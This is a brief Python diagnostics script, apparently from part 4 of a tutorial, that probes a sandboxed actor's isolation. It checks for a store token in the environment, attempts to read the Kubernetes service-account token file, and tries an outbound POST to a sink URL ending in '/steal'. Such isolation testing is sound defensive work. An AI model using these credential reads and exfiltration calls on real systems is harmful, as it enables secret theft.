# Part 4's diagnostics script, run inside a Substrate actor. Nothing to steal, nowhere to send it.
import os
print("env_store_token=%s" % ("STORE_TOKEN" in os.environ))
try:
    open("/var/run/secrets/kubernetes.io/serviceaccount/token")
    print("read_token=yes")
except Exception as e:
    print("read_token=%s" % type(e).__name__)
print("exfil=%s" % egress("POST", "http://sink.internet.svc.cluster.local:9000/steal", b"probe"))
